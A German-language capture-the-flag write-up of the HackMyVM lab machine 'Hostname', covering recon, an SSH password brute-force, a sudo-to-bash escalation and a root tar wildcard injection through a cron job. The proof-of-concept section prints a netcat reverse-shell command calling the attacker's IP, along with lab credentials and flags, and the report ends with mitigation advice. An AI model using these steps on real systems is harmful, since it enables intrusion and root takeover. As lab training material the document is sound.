# Hostname (HackMyVM) - Penetration Test Bericht

![Hostname.png](Hostname.png)

**Datum des Berichts:** 25. Oktober 2022  
**VM:** Hostname  
**Plattform:** HackMyVM ([Link zur VM](https://hackmyvm.eu/machines/machine.php?vm=Hostname))  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Hostname_HackMyVM_Easy/](https://alientec1908.github.io/Hostname_HackMyVM_Easy/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Credential Discovery](#phase-2-web-enumeration--credential-discovery)
5.  [Phase 3: Initial Access (SSH als po)](#phase-3-initial-access-ssh-als-po)
6.  [Phase 4: Privilege Escalation (Kette)](#phase-4-privilege-escalation-kette)
    *   [po zu oogway (Sudo/Bash)](#po-zu-oogway-sudobash)
    *   [oogway zu root (Cronjob & Tar Wildcard Injection)](#oogway-zu-root-cronjob--tar-wildcard-injection)
7.  [Proof of Concept (Root Access via Tar Wildcard Injection)](#proof-of-concept-root-access-via-tar-wildcard-injection)
8.  [Flags](#flags)
9.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Hostname" von HackMyVM (Schwierigkeitsgrad: Easy). Die initiale Erkundung offenbarte offene SSH- und HTTP-Dienste. Die Web-Enumeration der `index.php` und zugehöriger Skripte enthüllte Hinweise auf den Benutzernamen `Kung_Fu_P4nda` (dekodiert aus Base64) und das Passwort `!ts-bl4nk`. Versuche, versteckte Daten in einer Bilddatei (`bg.png`) mittels Steganographie-Tools (steghide, stegseek, stegsnow) zu finden, waren erfolglos. Der SSH-Zugriff gelang schließlich mit den Zugangsdaten `po:!ts-bl4nk`.

Die Privilegieneskalation erfolgte in zwei Schritten:
1.  **po zu oogway:** Eine unsichere `sudo`-Regel in `/etc/sudoers.d/po` erlaubte dem Benutzer `po`, `/bin/bash` als Benutzer `oogway` ohne Passwort auszuführen.
2.  **oogway zu root:** Ein Cronjob in `/etc/crontab` führte jede Minute `tar -zcf /var/backups/secret.tgz *` im Verzeichnis `/opt/secret/` als `root` aus. Da `oogway` Schreibrechte in `/opt/secret/` hatte, konnte diese Konfiguration mittels "Tar Wildcard Injection" ausgenutzt werden. Durch das Erstellen speziell benannter Dateien (`--checkpoint=1` und `--checkpoint-action=exec=sh rs`) und einer Payload-Datei (`rs`, die eine Reverse Shell startete) wurde eine Root-Shell erlangt.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `echo`
*   `base64`
*   `steghide`
*   `stegseek`
*   `stegsnow`
*   `hydra`
*   `ssh`
*   `sudo`
*   `cat`
*   `grep`
*   `find`
*   `touch`
*   `nc (netcat)`
*   `tar` (implizit durch Ausnutzung)

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.112` (VirtualBox VM).

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -A 192.168.2.112 -p-`) offenbarte:
        *   **Port 22 (SSH):** OpenSSH 8.4p1 Debian
        *   **Port 80 (HTTP):** nginx 1.18.0 (Seitentitel: "Panda", Hostname: `hostname`)

---

## Phase 2: Web Enumeration & Credential Discovery

1.  **Verzeichnis-Enumeration (Gobuster):**
    *   `gobuster dir -u http://192.168.2.112 [...]` fand `/index.php` und `/assets` (403 Forbidden).

2.  **Analyse von Web-Inhalten:**
    *   Ein Kommentar in `index.php` enthielt den Hinweis "Kung Fu Panda".
    *   Weitere Hinweise aus Web-Skripten (z.B. `script.js`):
        *   Base64-String: `S3VuZ19GdV9QNG5kYQ==` -> dekodiert zu `Kung_Fu_P4nda`
        *   Mögliche Passwortkandidaten: `IMPSSIBLE`, `IM'PSSIBLE`, `!ts-bl4nk`

3.  **Steganographie-Versuche (erfolglos):**
    *   Eine Bilddatei `bg.png` wurde auf der Webseite gefunden.
    *   Versuche, mit `steghide`, `stegseek` (mit `rockyou.txt`) und `stegsnow` versteckte Daten zu extrahieren, scheiterten.

---

## Phase 3: Initial Access (SSH als po)

1.  **SSH Brute-Force (Hydra):**
    *   Ein erster `hydra`-Versuch gegen den Benutzer `panda` mit `rockyou.txt` war erfolglos.
    *   Ein zweiter `hydra`-Angriff auf den Benutzer `po` (basierend auf den "Kung Fu Panda"-Hinweisen) mit dem Passwortkandidaten `!ts-bl4nk` war erfolgreich:
        ```bash
        hydra -l po -P [Wortliste_mit_!ts-bl4nk] ssh://panda.hmv # (Host in /etc/hosts: 192.168.2.112)
        # Gefunden: po : !ts-bl4nk
        ```
        *(Hinweis: `panda.hmv` wurde vermutlich vorher der `/etc/hosts`-Datei hinzugefügt)*

2.  **SSH-Login als `po`:**
    *   Mit den gefundenen Zugangsdaten wurde ein SSH-Login durchgeführt:
        ```bash
        ssh po@panda.hmv
        # Passwort: !ts-bl4nk
        ```
    *   Initialer Zugriff als `po` auf dem System `hostname` wurde erlangt.

---

## Phase 4: Privilege Escalation (Kette)

### po zu oogway (Sudo/Bash)

1.  **Sudo-Rechte-Prüfung für `po`:**
    *   `sudo -l` zeigte zunächst keine direkten `root`-Rechte.
    *   Die Benutzer `root`, `po` und `oogway` wurden in `/etc/passwd` mit Bash-Shells identifiziert.
    *   Die Datei `/etc/sudoers.d/po` enthielt die Regel:
        ```
        po HackMyVM = (oogway) NOPASSWD: /bin/bash
        ```
        *(Hinweis: `NPASSWD` im Original-Log ist wahrscheinlich ein Tippfehler und sollte `NOPASSWD` sein)*

2.  **Ausnutzung:**
    *   `sudo -u oogway /bin/bash`
    *   Obwohl eine Fehlermeldung (`sudo: unable to resolve host HackMyVM`) erschien, wurde erfolgreich eine Shell als Benutzer `oogway` erlangt.
    *   Die User-Flag wurde in `/home/oogway/user.txt` gefunden: `081ecc5e6dd6ba0d150fc4bc0e62ec50`.

### oogway zu root (Cronjob & Tar Wildcard Injection)

1.  **Enumeration als `oogway`:**
    *   `grep -lir "/opt/secret" / 2>/dev/null` fand die Datei `/etc/crontab`.
    *   `cat /etc/crontab` enthüllte einen kritischen Cronjob:
        ```cron
        * * * * * root cd /opt/secret/ && tar -zcf /var/backups/secret.tgz *
        ```
    *   Dieser Cronjob führt jede Minute `tar` mit einer Wildcard (`*`) als `root` im Verzeichnis `/opt/secret/` aus. Es wurde angenommen, dass `oogway` Schreibrechte in `/opt/secret/` hat.

2.  **Vorbereitung der Tar Wildcard Injection:**
    *   Im Verzeichnis `/opt/secret/` wurden als `oogway` folgende Dateien erstellt:
        ```bash
        touch -- --checkpoint=1
        touch -- "--checkpoint-action=exec=sh rs"
        echo "nc -e /bin/bash [Angreifer-IP] 80" > rs 
        # Ersetze [Angreifer-IP] mit der IP des Angreifer-Systems (z.B. 192.168.2.153)
        ```

3.  **Empfang der Root-Shell:**
    *   Auf dem Angreifer-System wurde ein Netcat-Listener gestartet: `nc -lvnp 80`.
    *   Nach maximal einer Minute führte der Cronjob auf dem Zielsystem die `tar`-Payload aus, was eine Reverse Shell als `root` zum Listener des Angreifers startete.
    *   `id` in der neuen Shell bestätigte `uid=0(root)`.

---

## Proof of Concept (Root Access via Tar Wildcard Injection)

**Kurzbeschreibung:** Die finale Privilegieneskalation erfolgte durch Ausnutzung eines unsicher konfigurierten Cronjobs. Dieser führte `tar` mit einer Wildcard als `root` in einem für den Benutzer `oogway` beschreibbaren Verzeichnis (`/opt/secret/`) aus. Durch Erstellen von Dateien mit speziellen Namen, die von `tar` als Optionen interpretiert werden (`--checkpoint=1` und `--checkpoint-action=exec=sh [SKRIPT]`), konnte beliebiger Code (hier eine Reverse Shell) als `root` ausgeführt werden.

**Schritte (als `oogway`):**
1.  Wechsle in das Verzeichnis `/opt/secret/` (falls nicht bereits geschehen).
2.  Erstelle die Payload-Dateien:
    ```bash
    touch -- --checkpoint=1
    touch -- "--checkpoint-action=exec=sh rs"
    echo "nc -e /bin/bash [IP_DES_ANGREIFERS] [PORT]" > rs 
    # z.B. echo "nc -e /bin/bash 192.168.2.153 80" > rs
    chmod +x rs # Sicherstellen, dass das Skript ausführbar ist
    ```
3.  Starte einen Netcat-Listener auf dem Angreifer-System auf dem gewählten Port:
    ```bash
    nc -lvnp [PORT] # z.B. nc -lvnp 80
    ```
4.  Warte maximal eine Minute, bis der Cronjob ausgeführt wird.
**Ergebnis:** Eine Reverse Shell mit `uid=0(root)` verbindet sich zum Listener.

---

## Flags

*   **User Flag (`/home/oogway/user.txt`):**
    ```
    081ecc5e6dd6ba0d150fc4bc0e62ec50
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    d5806296126a30ceebeaa172ff9c9151
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Passwortsicherheit:**
    *   Erzwingen Sie starke, einzigartige Passwörter. Vermeiden Sie thematische Passwörter (wie `!ts-bl4nk` im Kontext von "Panda").
    *   Implementieren Sie Mechanismen zur Erkennung und Blockierung von Brute-Force-Angriffen auf SSH (z.B. `fail2ban`).
    *   Bevorzugen Sie SSH-Schlüssel-Authentifizierung gegenüber Passwort-Authentifizierung.
*   **Informationspreisgabe:**
    *   Vermeiden Sie es, Hinweise auf Benutzernamen, Passwörter oder interne Systemdetails in öffentlich zugänglichen Webdateien (HTML-Kommentare, JavaScript) zu hinterlassen. Base64 ist keine Verschlüsselung.
*   **Steganographie:**
    *   Obwohl hier erfolglos, sollten Administratoren sich der Möglichkeit bewusst sein, dass Daten in Bildern oder anderen Medien versteckt werden können.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Korrigieren Sie die unsichere `sudo`-Regel für den Benutzer `po`. Erlauben Sie niemals das Ausführen einer vollständigen Shell (`/bin/bash`) als ein anderer Benutzer ohne triftigen Grund und ohne Passwort, insbesondere nicht, wenn der Hostname-Teil der Regel (`HackMyVM`) nicht mit dem tatsächlichen Hostnamen übereinstimmt.
*   **Cronjob-Sicherheit:**
    *   **KRITISCH:** Überarbeiten Sie den unsicheren Cronjob in `/etc/crontab` sofort. **Verwenden Sie niemals ungeschützte Wildcards (`*`) in Befehlen (wie `tar`), die mit erhöhten Rechten laufen und auf potenziell von Benutzern beschreibbare Verzeichnisse zugreifen.**
        *   Spezifizieren Sie die zu sichernden Dateien explizit.
        *   Verwenden Sie `find` in Kombination mit `tar` und `--null -T -` für sicheres Piping.
        *   Stellen Sie sicher, dass Verzeichnisse, auf die Root-Cronjobs zugreifen, nicht von unprivilegierten Benutzern beschreibbar sind.
        *   Verwenden Sie absolute Pfade für alle Befehle in Cronjobs.
*   **Allgemeine Systemhärtung:**
    *   Überprüfen Sie Dateiberechtigungen und `sudo`-Regeln regelmäßig.
    *   Implementieren Sie das Prinzip der geringsten Rechte.

---

**Ben C. - Cyber Security Reports**
